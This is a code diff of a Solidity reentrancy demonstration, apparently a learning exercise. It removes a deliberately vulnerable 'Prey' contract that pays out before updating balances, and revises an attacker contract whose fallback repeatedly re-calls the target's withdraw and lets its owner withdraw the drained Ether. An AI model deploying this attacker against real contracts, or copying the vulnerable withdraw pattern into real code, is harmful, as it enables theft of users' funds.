@@ -1,31 +1,9 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >=0.6.2 <0.8.0;
-// pragma solidity ^0.8.0;
-
-contract Prey {
-    mapping(address => uint) public balances;
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
-    }
-
-    function withdraw(uint amount) public {
-        require(balances[msg.sender] >= amount);
-    
-        (bool sent, ) = msg.sender.call{value: amount}("");
-        require(sent, "Failed to send Ether");
-
-        // balances[msg.sender] = 0;
-        balances[msg.sender] -= amount; // 大于0.8.0的solidity编译器自带safemath，拥有益处检测机制。
-    }
-
-    // Helper function to check the balance of this contract
-    function getConBalance() public view returns (uint) {
-        return address(this).balance;
-    }
-}
-
-contract Reentrance {
+pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/access/Ownable.sol";
+contract Reentrance is Ownable{
     address public preyAddr;
+
     constructor(address _preyAddrAddress) {
         preyAddr = _preyAddrAddress;
     }
@@ -33,7 +11,7 @@ contract Reentrance {
     // Fallback is called when preyAddr sends Ether to this contract.
     fallback() external payable {
         if (address(preyAddr).balance >= 1 ether) {
-            preyAddr.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
+            (bool success,) = preyAddr.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
         }
         
     }
@@ -47,11 +25,18 @@ contract Reentrance {
     }
 
     // Helper function to check the balance of this contract
-    function getConBalance() public view returns (uint) {
+    function getBalance() public view returns (uint) {
         return address(this).balance;
     }
 
     function setPreyAddre(address addr) public{
         preyAddr = addr;
+    }
+
+    // 提取款项
+    function withdraw(uint amount) onlyOwner  public {
+        if (amount < address(this).balance){
+            payable(msg.sender).transfer(amount);
+        }
     }
 }
